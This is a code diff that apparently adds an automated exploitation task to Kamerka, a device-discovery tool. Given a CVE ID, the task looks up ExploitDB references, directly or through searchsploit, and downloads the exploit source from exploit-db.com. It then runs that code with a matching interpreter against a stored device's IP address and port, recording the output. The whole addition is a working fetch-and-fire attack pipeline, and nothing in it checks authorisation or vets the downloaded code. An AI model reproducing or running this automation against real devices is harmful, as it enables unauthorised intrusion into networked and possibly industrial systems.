@@ -4166,3 +4166,226 @@ def capture_screenshot(self, device_id):
     except Exception as e:
         logger.warning("Screenshot capture error for %s: %s", device.ip, e)
         return {"error": "Screenshot failed: {}".format(str(e))}
+
+
+# ---------------------------------------------------------------------------
+# CVE Exploit — search, download and execute an ExploitDB exploit for a CVE
+# ---------------------------------------------------------------------------
+
+# Regex for a valid CVE ID
+_CVE_RE = re.compile(r'^CVE-\d{4}-\d{4,}$', re.IGNORECASE)
+
+# Mapping of shebang tokens → interpreter binary
+_SHEBANG_MAP = {
+    "python3": "python3",
+    "python":  "python3",
+    "ruby":    "ruby",
+    "perl":    "perl",
+    "bash":    "bash",
+    "sh":      "sh",
+}
+
+
+def _interpreter_for(source: str) -> str:
+    """Detect interpreter from the shebang of *source*.  Returns 'python3' as fallback."""
+    first = source.lstrip().split("\n", 1)[0] if source else ""
+    if first.startswith("#!"):
+        for token, interp in _SHEBANG_MAP.items():
+            if token in first:
+                return interp
+    # Heuristic: Ruby Metasploit modules use require 'msf/core'
+    if "require 'msf/core'" in source or 'require "msf/core"' in source:
+        return "ruby"
+    return "python3"
+
+
+def _download_exploitdb(edb_id: str) -> str | None:
+    """Download raw exploit source from ExploitDB.  Returns content or None on error."""
+    # Only numeric IDs are valid
+    if not str(edb_id).strip().isdigit():
+        return None
+    url = "https://www.exploit-db.com/download/{}".format(str(edb_id).strip())
+    try:
+        resp = requests.get(url, timeout=20, headers={"User-Agent": "Kamerka/1.0"})
+        if resp.status_code == 200 and resp.text:
+            return resp.text
+    except Exception as exc:
+        logger.warning("ExploitDB download failed for id %s: %s", edb_id, exc)
+    return None
+
+
+@shared_task(bind=True)
+def run_cve_exploit(self, device_id: int, cve_id: str):
+    """Search, download and execute an ExploitDB exploit for *cve_id* against *device_id*.
+
+    Workflow
+    --------
+    1. Validate the CVE ID format.
+    2. Look up the VulnIntelligence record for this device + CVE to obtain
+       stored ``exploit_refs`` (ExploitDB URLs / IDs).
+    3. For each ref, download the raw exploit source from exploit-db.com.
+    4. Detect the interpreter via shebang.
+    5. Write the source to a secure temp file and execute it with the target
+       IP and port as the first two positional arguments.
+    6. Save the combined stdout/stderr output to ``Device.exploit`` and set
+       ``Device.exploited_scanned = True``.
+
+    Returns a dict with keys ``status``, ``output``, ``cve_id``, and ``exploit_url``.
+    """
+    progress_recorder = ProgressRecorder(self)
+    progress_recorder.set_progress(0, 4, description="Validating…")
+
+    # ------------------------------------------------------------------
+    # 1. Validate CVE ID
+    # ------------------------------------------------------------------
+    if not cve_id or not _CVE_RE.match(cve_id.strip()):
+        return {"status": "error", "output": "Invalid CVE ID: {}".format(cve_id)}
+
+    cve_id = cve_id.strip().upper()
+
+    # ------------------------------------------------------------------
+    # 2. Look up device and VulnIntelligence
+    # ------------------------------------------------------------------
+    try:
+        device = Device.objects.get(id=device_id)
+    except Device.DoesNotExist:
+        return {"status": "error", "output": "Device {} not found.".format(device_id)}
+
+    ip = device.ip
+    port = str(device.port or "80").strip().split(",")[0].strip()
+
+    progress_recorder.set_progress(1, 4, description="Looking up exploit refs…")
+
+    vi = VulnIntelligence.objects.filter(device=device, cve_id__iexact=cve_id).first()
+
+    exploit_refs = []
+    if vi and vi.exploit_refs:
+        try:
+            exploit_refs = json.loads(vi.exploit_refs)
+        except (json.JSONDecodeError, TypeError):
+            exploit_refs = []
+
+    if not exploit_refs:
+        # No exploit refs stored yet — try a quick searchsploit lookup
+        searchsploit_bin = shutil.which("searchsploit")
+        if searchsploit_bin:
+            try:
+                result = subprocess.run(
+                    [searchsploit_bin, "--cve", cve_id, "-j"],
+                    capture_output=True,
+                    text=True,
+                    timeout=30,
+                )
+                if result.returncode == 0 and result.stdout:
+                    ss_data = json.loads(result.stdout)
+                    for exp in ss_data.get("RESULTS_EXPLOIT", []):
+                        edb_id = exp.get("EDB-ID", "")
+                        title = exp.get("Title", "Unknown")
+                        if edb_id:
+                            exploit_refs.append({
+                                "url": "https://www.exploit-db.com/exploits/{}".format(edb_id),
+                                "title": title,
+                                "edb_id": str(edb_id),
+                            })
+            except Exception as exc:
+                logger.warning("searchsploit lookup failed for %s: %s", cve_id, exc)
+
+    if not exploit_refs:
+        msg = "No ExploitDB references found for {}. Run ExploitDB Search first.".format(cve_id)
+        return {"status": "not_found", "output": msg, "cve_id": cve_id}
+
+    progress_recorder.set_progress(2, 4, description="Downloading exploit…")
+
+    # ------------------------------------------------------------------
+    # 3 & 4. Download and execute the first available exploit
+    # ------------------------------------------------------------------
+    last_error = "No exploit could be executed."
+    for ref in exploit_refs:
+        edb_id = ref.get("edb_id", "")
+        exploit_url = ref.get("url", "")
+
+        # Derive edb_id from URL if not stored directly
+        if not edb_id and exploit_url:
+            m = re.search(r"/(\d+)(?:/|$)", exploit_url)
+            if m:
+                edb_id = m.group(1)
+
+        if not edb_id:
+            continue
+
+        source = _download_exploitdb(edb_id)
+        if not source:
+            last_error = "Could not download exploit {} from ExploitDB.".format(edb_id)
+            continue
+
+        interpreter = _interpreter_for(source)
+        interp_bin = shutil.which(interpreter)
+        if not interp_bin:
+            last_error = "Interpreter '{}' not found on this system.".format(interpreter)
+            continue
+
+        progress_recorder.set_progress(3, 4, description="Executing exploit {}…".format(edb_id))
+
+        tmp_path = None
+        try:
+            # Write source to a secure temporary file
+            suffix = ".rb" if interpreter == "ruby" else ".py" if "python" in interpreter else ".sh"
+            with tempfile.NamedTemporaryFile(
+                mode="w",
+                suffix=suffix,
+                delete=False,
+                prefix="kamerka_exploit_",
+                dir=tempfile.gettempdir(),
+            ) as tmp:
+                tmp.write(source)
+                tmp_path = tmp.name
+
+            os.chmod(tmp_path, 0o700)
+
+            proc = subprocess.run(
+                [interp_bin, tmp_path, ip, port],
+                capture_output=True,
+                text=True,
+                timeout=60,
+            )
+
+            combined = (proc.stdout or "") + (proc.stderr or "")
+            combined = combined.strip() or "(no output)"
+
+            result_dict = {
+                "status":      "executed",
+                "cve_id":      cve_id,
+                "exploit_url": exploit_url,
+                "edb_id":      edb_id,
+                "interpreter": interpreter,
+                "returncode":  proc.returncode,
+                "output":      combined[:8192],  # cap stored output
+            }
+
+            device.exploit = json.dumps(result_dict)
+            device.exploited_scanned = True
+            device.save()
+
+            progress_recorder.set_progress(4, 4, description="Done")
+            return result_dict
+
+        except subprocess.TimeoutExpired:
+            last_error = "Exploit {} timed out after 60 seconds.".format(edb_id)
+            logger.warning("Exploit %s timed out for device %s", edb_id, device_id)
+        except Exception as exc:
+            last_error = "Exploit {} execution error: {}".format(edb_id, str(exc))
+            logger.warning("Exploit %s error for device %s: %s", edb_id, device_id, exc)
+        finally:
+            if tmp_path and os.path.exists(tmp_path):
+                try:
+                    os.unlink(tmp_path)
+                except OSError:
+                    pass
+
+    # All refs tried and failed
+    device.exploit = json.dumps({"status": "failed", "cve_id": cve_id, "output": last_error})
+    device.exploited_scanned = True
+    device.save()
+
+    progress_recorder.set_progress(4, 4, description="Done")
+    return {"status": "failed", "cve_id": cve_id, "output": last_error}
